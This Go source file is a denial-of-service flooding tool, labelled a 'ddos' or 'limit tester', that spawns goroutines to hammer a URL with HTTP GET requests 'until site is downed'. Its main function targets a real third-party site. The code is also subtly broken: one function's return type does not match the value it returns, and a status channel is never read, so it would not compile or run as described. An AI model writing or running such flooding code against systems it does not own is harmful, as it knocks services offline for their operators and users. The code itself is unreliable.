//test server or site request limit with ddos, sends requests until site is downed
//returns amounts of requested need to break server or site
package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync/atomic"
)

//RequestParams values
type RequestParams struct {
	url           string
	requestsLimit int
	requestStatus *chan int
	stop          *chan bool

	//requests statistics
	sucessfulRequest int64
	amountRequests   int64
}

//ddos initializer for new attack/limit tester
func limitTester(URL string, requests int) (*RequestParams, error) {
	if requests < 1 {
		return nil, fmt.Errorf("Requests cannot be less than 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error =%v", err)
	}
	status := make(chan int)
	s := make(chan bool)
	return &RequestParams{
		url:           URL,
		requestsLimit: requests,
		requestStatus: &status,
		stop:          &s,
	}, nil
}

//run ddos/limit tester
func (r *RequestParams) runLimits() {
	for i := 0; i < r.requestsLimit; i++ {
		go func() {
			for {
				select {
				case <-(*r.stop):
					return
				//http get requests
				default:
					resp, err := http.Get(r.url)
					atomic.AddInt64(&r.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&r.sucessfulRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
						(*r.requestStatus) <- resp.StatusCode
					}
				}
			}
		}()
	}
}

//Stops ddos once limits reached
func (r *RequestParams) stopLimits() {
	for i := 0; i < r.requestsLimit; i++ {
		(*r.stop) <- true
	}
	close(*r.stop)
}

//Results - results of RequestParams
func (r RequestParams) Results() (succesfulRequest, amountRequests int64, status chan<- RequestParams) {
	return r.sucessfulRequest, r.amountRequests, r.requestStatus
}

func main() {
	requests := 2
	r, err := limitTester("http://gopl.io", requests)
	if err != nil {
		panic(err)
	}
	r.runLimits()
	r.stopLimits()
	fmt.Println(r.requestStatus)
}
